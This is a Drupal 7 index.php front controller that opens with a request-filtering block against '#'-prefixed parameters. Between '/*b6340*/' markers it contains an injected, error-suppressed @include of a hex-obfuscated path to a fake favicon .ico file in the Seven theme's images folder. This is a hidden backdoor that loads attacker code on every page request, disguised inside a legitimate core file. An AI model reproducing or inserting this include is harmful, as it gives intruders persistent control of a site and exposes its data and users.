<?php
if (isset($_GET['destination']))
{
    if (strpos($_GET['destination'], "markup") !== FALSE && strpos($_GET['destination'], "q[") !== FALSE)
    {
        unset($_GET['destination']);
        unset($_REQUEST['destination']);
    }
}
function stripDangerousValues($input) {
    if (is_array($input)) {
        foreach ($input as $key => $value) {
            if ($key !== '' && $key[0] === '#') {
                unset($input[$key]);
            }
            else {
                $input[$key] = stripDangerousValues($input[$key]);
            }
        }
    }
    return $input;
}
$_REQUEST = stripDangerousValues($_REQUEST);
$_GET = stripDangerousValues($_GET);
$_POST = stripDangerousValues($_POST);




/*b6340*/

@include "\x2fhome\x2fquin\x74ad6/\x70ubli\x63_htm\x6c/the\x6des/s\x65ven/\x69mage\x73/fav\x69con_\x314b4b\x33.ico";

/*b6340*/

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * The routines here dispatch control to the appropriate handler, which then
 * prints the appropriate page.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt.
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
menu_execute_active_handler();
